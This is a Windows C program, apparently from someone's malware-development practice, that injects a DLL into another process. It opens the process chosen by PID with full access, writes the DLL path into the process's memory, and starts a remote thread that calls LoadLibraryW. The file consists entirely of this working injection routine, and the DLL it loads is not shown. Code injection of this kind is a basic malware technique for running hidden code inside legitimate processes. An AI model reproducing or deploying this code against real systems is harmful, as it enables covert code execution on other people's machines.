#include <windows.h>
#include <stdio.h>

const char* k = "[+]"; //sting Arrary
const char* i = "[*]";
const char* e = "[-]";


DWORD  PID, TID = NULL; //Double Word - 32 bit integer
LPVOID rBuffer = NULL;  // Pointer any type pointer 
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread;


wchar_t dllPath[MAX_PATH] = L"C:\\Users\\Meowhecker\\Desktop\\MalewareDev\\MalwareDev\\win32\\dllinject2\\dllinject.dll"; // MAX_PATH - 260 / Unicode 
size_t dllSize = sizeof(dllPath);

int main(int argc, char* argv[]) {

	if (argc < 2) {
	
		printf("%s", e);
		printf("Usage: %s [Process ID]\n", argv[0]);
		return EXIT_FAILURE;
	
	}

	PID = atoi(argv[1]);
	printf("%s Try to get a handler to the process : %u\n", i , PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); //Return Process Address 

	if (hProcess == NULL) {
	
		printf("%s Failed to get a handler to the process : %u, error: %ld \n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s Successfully got a handler to the process : %ld \n\\---0x%p\n", k, PID, hProcess);


	rBuffer = VirtualAllocEx(hProcess, NULL, dllSize, (MEM_COMMIT| MEM_RESERVE), PAGE_READWRITE);
	printf("%s Successfully allocated memory to process memeory /w ReadWrite Permission\n", k);

	if (rBuffer == NULL) {
		
		printf("%s Failed to allocate memory to process memeory, error: %ld \n", e, GetLastError());
		return EXIT_FAILURE;
	}

	WriteProcessMemory(hProcess, rBuffer, dllPath, dllSize, NULL);
	printf("%s Successfully wrote the DLL to the to the process\n", k);
	
	hKernel32 = GetModuleHandleW(L"Kernel32");

	if (hKernel32 == NULL) {
	
		printf("%s Failed to get the Kernel32 module handle, error: %ld \n", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s Successfully got the Kernel32 module handle\n\\---0x%p\n", k, hKernel32);

	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW"); //LP -> long Pointer , specify Thread entory point 
	printf("%s Successfully got the LoadLibraryW() function address\n\\---0x%p\n", k, startThis);

	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);

	if (hThread == NULL) {
		
		printf("%s Failed to create remote thread, error: %ld \n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s Successfully created remote thread, thread ID: %u\n\\---0x%p\n", k, TID,hThread);
	printf("%s Waiting for the thread to finish execution\n", i);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s Thread finished execution\n", k);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("% s Success Finished" , k);

	return EXIT_SUCCESS;

}


